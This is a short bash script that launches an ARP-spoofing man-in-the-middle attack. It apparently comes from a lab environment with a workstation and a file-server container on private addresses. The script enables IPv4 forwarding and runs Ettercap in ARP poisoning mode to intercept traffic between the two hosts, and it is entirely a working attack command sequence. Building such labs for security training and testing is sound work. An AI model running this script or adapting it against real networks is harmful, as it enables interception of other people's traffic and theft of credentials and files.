#!/bin/bash

echo "[ATTACK] Waiting for targets to come online..."
sleep 5  # wait 5 seconds for file-server & workstation to start

echo "[ATTACK] Starting ARP spoofing..."
echo "[TARGET] Workstation: 172.20.0.20"
echo "[TARGET] File-server: 172.20.0.10"

# Enable IPv4 forwarding so MITM works
sysctl -w net.ipv4.ip_forward=1 >/dev/null

# Run Ettercap in text mode against the two targets
ettercap -T -M arp:remote /172.20.0.20// /172.20.0.10// -i eth0
